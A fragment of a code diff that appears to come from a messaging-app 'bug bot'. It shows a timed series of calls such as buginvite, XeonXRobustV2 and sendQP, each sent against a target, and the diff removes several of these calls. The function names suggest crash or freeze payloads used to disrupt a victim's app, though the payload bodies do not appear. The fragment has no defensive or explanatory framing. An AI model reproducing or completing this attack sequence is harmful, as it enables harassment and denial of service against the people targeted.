@@ -2921,16 +2921,11 @@ await sleep(1000);
 await buginvite(target, { ptcp: true });
 await XeonXRobustV2cp1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1000);
-sendQP(target, wanted);
 await XeonXRobustV2cp2(viper, target, (cct = true), (Ptcp = true));
-await sleep(1000);
-await sendQP(target, wanted);
 await sleep(1000);
 await XeonXRobustV2(viper, target, (cct = true), (Ptcp = true));
 await sleep(1000);
 await XeonXRobustV2(viper, target)
-await sleep(1000);
-await sendSessionStructure(target, wanted);
 await sleep(1000);
 await XeonXRobust(viper, target);
 await sleep(1000);
